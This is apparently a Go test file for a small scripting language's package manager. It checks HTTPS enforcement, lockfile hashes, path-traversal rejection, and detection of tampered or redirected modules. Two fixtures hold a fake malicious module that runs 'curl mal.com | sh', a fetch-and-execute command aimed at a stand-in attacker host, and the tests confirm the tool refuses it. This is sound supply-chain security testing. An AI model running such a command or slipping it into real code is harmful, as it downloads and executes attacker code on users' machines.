package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// servidorModulos e um "GitHub/CDN" falso em TLS: caminho -> conteudo,
// mutavel no meio do teste (pra simular alguem trocando o arquivo).
type servidorModulos struct {
	mu       sync.Mutex
	arquivos map[string]string
	pedidos  []string
	srv      *httptest.Server
}

func (s *servidorModulos) poe(caminho, conteudo string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.arquivos[caminho] = conteudo
}

func (s *servidorModulos) contaPedidos() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.pedidos)
}

// novoServidorModulos sobe o servidor TLS e aponta o gs pra ele (cliente que
// confia no certificado de teste + raw do GitHub = este servidor).
func novoServidorModulos(t *testing.T) *servidorModulos {
	t.Helper()
	s := &servidorModulos{arquivos: map[string]string{}}
	s.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		s.mu.Lock()
		s.pedidos = append(s.pedidos, r.URL.Path)
		c, ok := s.arquivos[r.URL.Path]
		s.mu.Unlock()
		if !ok {
			http.NotFound(w, r)
			return
		}
		io.WriteString(w, c)
	}))
	velhoCliente, velhoRaw := clienteHTTP, baseRawGitHub
	clienteHTTP, baseRawGitHub = s.srv.Client(), s.srv.URL
	t.Cleanup(func() {
		s.srv.Close()
		clienteHTTP, baseRawGitHub = velhoCliente, velhoRaw
	})
	return s
}

func projetoVazio(t *testing.T, deps map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	m := map[string]interface{}{"nome": "teste", "versao": "0.1.0", "principal": "principal.gs", "dependencias": deps}
	blob, _ := json.MarshalIndent(m, "", "  ")
	if err := os.WriteFile(filepath.Join(dir, arqManifesto), blob, 0644); err != nil {
		t.Fatal(err)
	}
	return dir
}

func leArquivo(t *testing.T, caminho string) string {
	t.Helper()
	b, err := os.ReadFile(caminho)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

const modDatas = "gambiarra hoje()\n    funciona \"segunda\"\nacabou_finalmente\n"
const modUtil = "bota versao = \"1.0\"\n"

func TestResolveFonte(t *testing.T) {
	velho := baseRawGitHub
	baseRawGitHub = "https://raw.githubusercontent.com"
	defer func() { baseRawGitHub = velho }()

	casos := []struct {
		spec, specOut, url, nome string
	}{
		{"github.com/fulano/libs/src/datas.gs@v1.2.0", "github.com/fulano/libs/src/datas.gs@v1.2.0",
			"https://raw.githubusercontent.com/fulano/libs/v1.2.0/src/datas.gs", "datas"},
		{"https://github.com/fulano/libs/datas.gs@3f2a9c1", "github.com/fulano/libs/datas.gs@3f2a9c1",
			"https://raw.githubusercontent.com/fulano/libs/3f2a9c1/datas.gs", "datas"},
		{"github.com/fulano/libs/datas.gs", "github.com/fulano/libs/datas.gs",
			"https://raw.githubusercontent.com/fulano/libs/HEAD/datas.gs", "datas"},
		{"https://exemplo.com/x/util.gs?v=2&y=1", "https://exemplo.com/x/util.gs?v=2&y=1",
			"https://exemplo.com/x/util.gs?v=2&y=1", "util"},
	}
	for _, c := range casos {
		f, err := resolveFonte(c.spec, false)
		if err != nil {
			t.Fatalf("%s: erro %v", c.spec, err)
		}
		if f.Spec != c.specOut || f.URL != c.url || f.Nome != c.nome {
			t.Fatalf("%s: veio %+v", c.spec, f)
		}
	}

	ruins := []string{
		"http://exemplo.com/util.gs",          // sem TLS
		"ftp://exemplo.com/util.gs",           // esquema estranho
		"exemplo.com/util.gs",                 // sem esquema
		"https://exemplo.com/util.gs@v1",      // @ref fora do GitHub
		"github.com/fulano/libs@v1",           // sem caminho
		"github.com/fulano/libs/../x.gs@v1",   // escapando do repo
		"github.com/fulano/libs/x.gs@",        // ref vazia
		"github.com/fulano/libs/x.gs@v1/../a", // ref com ..
	}
	for _, s := range ruins {
		if _, err := resolveFonte(s, false); err == nil {
			t.Fatalf("%s devia ser recusado", s)
		}
	}
	if _, err := resolveFonte("http://exemplo.com/util.gs", true); err != nil {
		t.Fatalf("--inseguro devia liberar http: %v", err)
	}
}

func TestGetComRefGravaManifestoELock(t *testing.T) {
	s := novoServidorModulos(t)
	s.poe("/fulano/libs/v1.2.0/datas.gs", modDatas)
	dir := projetoVazio(t, map[string]string{})

	var out bytes.Buffer
	if err := pegaDependencia(dir, "github.com/fulano/libs/datas.gs@v1.2.0", "", false, &out); err != nil {
		t.Fatalf("get falhou: %v\n%s", err, out.String())
	}
	if got := leArquivo(t, filepath.Join(dir, dirModulos, "datas.gs")); got != modDatas {
		t.Fatalf("conteudo errado: %q", got)
	}
	m, err := lerManifesto(dir)
	if err != nil {
		t.Fatal(err)
	}
	deps, _ := depsDoManifesto(m)
	if deps["datas"] != "github.com/fulano/libs/datas.gs@v1.2.0" {
		t.Fatalf("manifesto sem a ref: %v", deps)
	}
	if m["nome"] != "teste" {
		t.Fatalf("get apagou outros campos do manifesto: %v", m)
	}

	esperado := `{
  "versao": 1,
  "dependencias": {
    "datas": {
      "fonte": "github.com/fulano/libs/datas.gs@v1.2.0",
      "url": "` + s.srv.URL + `/fulano/libs/v1.2.0/datas.gs",
      "sha256": "` + sha256Hex([]byte(modDatas)) + `"
    }
  }
}
`
	if got := leArquivo(t, filepath.Join(dir, arqLock)); got != esperado {
		t.Fatalf("lock diferente do esperado:\n%s\nesperado:\n%s", got, esperado)
	}
	if !strings.Contains(out.String(), `importa "gs_modulos/datas.gs"`) {
		t.Fatalf("saida sem a dica de importa: %s", out.String())
	}
}

func TestGetComNomeEURLComum(t *testing.T) {
	s := novoServidorModulos(t)
	s.poe("/libs/util.gs", modUtil)
	dir := projetoVazio(t, nil)
	if err := pegaDependencia(dir, s.srv.URL+"/libs/util.gs", "ferramentas.gs", false, io.Discard); err != nil {
		t.Fatal(err)
	}
	if got := leArquivo(t, filepath.Join(dir, dirModulos, "ferramentas.gs")); got != modUtil {
		t.Fatalf("conteudo errado: %q", got)
	}
	lock, _, _ := lerLock(dir)
	if lock.Dependencias["ferramentas"].URL != s.srv.URL+"/libs/util.gs" {
		t.Fatalf("lock errado: %+v", lock)
	}
}

func TestGetRecusaHTTPERedirecionamentoPraHTTP(t *testing.T) {
	plano := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, modUtil)
	}))
	defer plano.Close()
	novoServidorModulos(t)
	dir := projetoVazio(t, nil)

	err := pegaDependencia(dir, plano.URL+"/util.gs", "", false, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "https") {
		t.Fatalf("http:// devia ser recusado, veio %v", err)
	}
	if err := pegaDependencia(dir, plano.URL+"/util.gs", "", true, io.Discard); err != nil {
		t.Fatalf("--inseguro devia deixar: %v", err)
	}

	// https que redireciona pra http tambem e recusado
	// (todo servidor TLS do httptest usa o mesmo certificado de teste, entao
	// o cliente do `s` confia neste tambem)
	redir := httptest.NewTLSServer(http.RedirectHandler(plano.URL+"/util.gs", http.StatusFound))
	defer redir.Close()
	err = pegaDependencia(dir, redir.URL+"/util.gs", "outro.gs", false, io.Discard)
	if err == nil || !strings.Contains(err.Error(), "sem https") {
		t.Fatalf("redirecionamento pra http devia ser recusado, veio %v", err)
	}
}

func TestGetRecusaQueNaoParseia(t *testing.T) {
	s := novoServidorModulos(t)
	s.poe("/x.gs", "<html>404 de mentira</html>")
	dir := projetoVazio(t, nil)
	if err := pegaDependencia(dir, s.srv.URL+"/x.gs", "", false, io.Discard); err == nil {
		t.Fatal("html devia ser recusado")
	}
	if _, err := os.Stat(filepath.Join(dir, dirModulos, "x.gs")); err == nil {
		t.Fatal("nao devia ter salvo o arquivo")
	}
}

func TestInstalaGravaLockDeterministicoEUsaArquivoLocal(t *testing.T) {
	s := novoServidorModulos(t)
	s.poe("/fulano/libs/v2.0.0/datas.gs", modDatas)
	s.poe("/util.gs", modUtil)
	dir := projetoVazio(t, map[string]string{
		"util":  s.srv.URL + "/util.gs",
		"datas": "github.com/fulano/libs/datas.gs@v2.0.0",
	})

	if err := instalaDependencias(dir, false, false, io.Discard); err != nil {
		t.Fatal(err)
	}
	lock1 := leArquivo(t, filepath.Join(dir, arqLock))
	if strings.Index(lock1, `"datas"`) > strings.Index(lock1, `"util"`) {
		t.Fatalf("lock nao ta ordenado:\n%s", lock1)
	}
	if got := leArquivo(t, filepath.Join(dir, dirModulos, "util.gs")); got != modUtil {
		t.Fatalf("util errado: %q", got)
	}

	// segunda vez: arquivos locais batem com o lock, nem vai na rede
	antes := s.contaPedidos()
	var out bytes.Buffer
	if err := instalaDependencias(dir, false, false, &out); err != nil {
		t.Fatal(err)
	}
	if s.contaPedidos() != antes {
		t.Fatalf("instala com tudo conferido nao devia baixar nada:\n%s", out.String())
	}
	if lock2 := leArquivo(t, filepath.Join(dir, arqLock)); lock2 != lock1 {
		t.Fatalf("lock mudou sem motivo:\n%s\nvs\n%s", lock1, lock2)
	}
}

func TestInstalaRecusaConteudoAdulteradoEAtualiza(t *testing.T) {
	s := novoServidorModulos(t)
	s.poe("/fulano/libs/v1.0.0/datas.gs", modDatas)
	s.poe("/util.gs", modUtil)
	dir := projetoVazio(t, map[string]string{})
	if err := pegaDependencia(dir, "github.com/fulano/libs/datas.gs@v1.0.0", "", false, io.Discard); err != nil {
		t.Fatal(err)
	}
	if err := pegaDependencia(dir, s.srv.URL+"/util.gs", "", false, io.Discard); err != nil {
		t.Fatal(err)
	}
	lockAntes := leArquivo(t, filepath.Join(dir, arqLock))

	// clone novo: sem gs_modulos/, e alguem reescreveu a tag no servidor
	os.RemoveAll(filepath.Join(dir, dirModulos))
	adulterado := "gambiarra hoje()\n    roda_comando(\"curl mal.com | sh\")\nacabou_finalmente\n"
	s.poe("/fulano/libs/v1.0.0/datas.gs", adulterado)

	err := instalaDependencias(dir, false, false, io.Discard)
	var rec erroRecusa
	if !errors.As(err, &rec) {
		t.Fatalf("devia recusar com erroRecusa, veio %v", err)
	}
	msg := err.Error()
	for _, trecho := range []string{"RECUSADO", "datas", "cadeia de suprimentos", sha256Hex([]byte(modDatas)), sha256Hex([]byte(adulterado)), "--atualiza"} {
		if !strings.Contains(msg, trecho) {
			t.Fatalf("mensagem sem %q:\n%s", trecho, msg)
		}
	}
	// tudo ou nada: nem o util (que conferia) foi gravado, e o lock ficou igual
	if _, err := os.Stat(filepath.Join(dir, dirModulos)); err == nil {
		t.Fatal("recusa nao devia gravar nada em gs_modulos/")
	}
	if leArquivo(t, filepath.Join(dir, arqLock)) != lockAntes {
		t.Fatal("recusa nao devia mexer no lock")
	}

	// arquivo local adulterado tambem nao passa (cai no download e confere)
	os.MkdirAll(filepath.Join(dir, dirModulos), 0755)
	os.WriteFile(filepath.Join(dir, dirModulos, "datas.gs"), []byte(adulterado), 0644)
	if err := instalaDependencias(dir, false, false, io.Discard); !errors.As(err, &rec) {
		t.Fatalf("arquivo local adulterado devia ser recusado, veio %v", err)
	}

	// o dono confere e aceita a mudanca
	if err := instalaDependencias(dir, true, false, io.Discard); err != nil {
		t.Fatalf("--atualiza falhou: %v", err)
	}
	lock, _, _ := lerLock(dir)
	if lock.Dependencias["datas"].SHA256 != sha256Hex([]byte(adulterado)) {
		t.Fatalf("--atualiza nao reescreveu o hash: %+v", lock.Dependencias["datas"])
	}
	if lock.Dependencias["util"].SHA256 != sha256Hex([]byte(modUtil)) {
		t.Fatalf("--atualiza estragou o util: %+v", lock.Dependencias["util"])
	}
	if got := leArquivo(t, filepath.Join(dir, dirModulos, "datas.gs")); got != adulterado {
		t.Fatalf("--atualiza nao gravou o conteudo novo")
	}
	if err := instalaDependencias(dir, false, false, io.Discard); err != nil {
		t.Fatalf("depois do --atualiza devia conferir: %v", err)
	}
}

func TestInstalaFonteMudadaNoManifestoReResolve(t *testing.T) {
	s := novoServidorModulos(t)
	s.poe("/fulano/libs/v1.0.0/datas.gs", modDatas)
	s.poe("/fulano/libs/v1.1.0/datas.gs", modDatas+"# novidade\n")
	dir := projetoVazio(t, map[string]string{})
	if err := pegaDependencia(dir, "github.com/fulano/libs/datas.gs@v1.0.0", "", false, io.Discard); err != nil {
		t.Fatal(err)
	}
	m, _ := lerManifesto(dir)
	m["dependencias"] = map[string]interface{}{"datas": "github.com/fulano/libs/datas.gs@v1.1.0"}
	gravarManifesto(dir, m)
	if err := instalaDependencias(dir, false, false, io.Discard); err != nil {
		t.Fatal(err)
	}
	lock, _, _ := lerLock(dir)
	if e := lock.Dependencias["datas"]; e.Fonte != "github.com/fulano/libs/datas.gs@v1.1.0" || !strings.Contains(e.URL, "/v1.1.0/") {
		t.Fatalf("lock nao seguiu a fonte nova: %+v", e)
	}
}

func TestInstalaRecusaNomeQueEscapaDoDiretorio(t *testing.T) {
	novoServidorModulos(t)
	dir := projetoVazio(t, map[string]string{"../fora": "https://exemplo.com/x.gs"})
	if err := instalaDependencias(dir, false, false, io.Discard); err == nil || !strings.Contains(err.Error(), "invalido") {
		t.Fatalf("nome com ../ devia ser recusado, veio %v", err)
	}
}

func TestInstalaSemManifesto(t *testing.T) {
	if err := instalaDependencias(t.TempDir(), false, false, io.Discard); err == nil || !strings.Contains(err.Error(), "gs init") {
		t.Fatalf("sem gambiarra.json devia sugerir gs init, veio %v", err)
	}
}

// A url do lock nao e fonte de confianca: um PR que so mexe no
// gambiarra.lock (trocando url e hash pelos de um arquivo malicioso) nao pode
// fazer o gs instala baixar de outro lugar que nao a fonte do gambiarra.json.
func TestInstalaRecusaLockComUrlTrocada(t *testing.T) {
	s := novoServidorModulos(t)
	s.poe("/util.gs", modUtil)
	dir := projetoVazio(t, map[string]string{})
	if err := pegaDependencia(dir, s.srv.URL+"/util.gs", "", false, io.Discard); err != nil {
		t.Fatal(err)
	}
	os.RemoveAll(filepath.Join(dir, dirModulos))

	malicioso := "gambiarra soma(a, b)\n    roda_comando(\"curl mal.com | sh\")\nacabou_finalmente\n"
	atacante := novoServidorModulos(t)
	atacante.poe("/util.gs", malicioso)
	lock, _, _ := lerLock(dir)
	ent := lock.Dependencias["util"]
	ent.URL = atacante.srv.URL + "/util.gs"
	ent.SHA256 = sha256Hex([]byte(malicioso))
	lock.Dependencias["util"] = ent
	b, _ := json.MarshalIndent(lock, "", "  ")
	os.WriteFile(filepath.Join(dir, arqLock), b, 0644)

	err := instalaDependencias(dir, false, false, io.Discard)
	var rec erroRecusa
	if !errors.As(err, &rec) || !strings.Contains(err.Error(), "o lock manda baixar de "+atacante.srv.URL) {
		t.Fatalf("lock com url trocada devia ser recusado, veio %v", err)
	}
	if _, err := os.Stat(filepath.Join(dir, dirModulos, "util.gs")); err == nil {
		t.Fatal("nao devia ter instalado nada")
	}
}
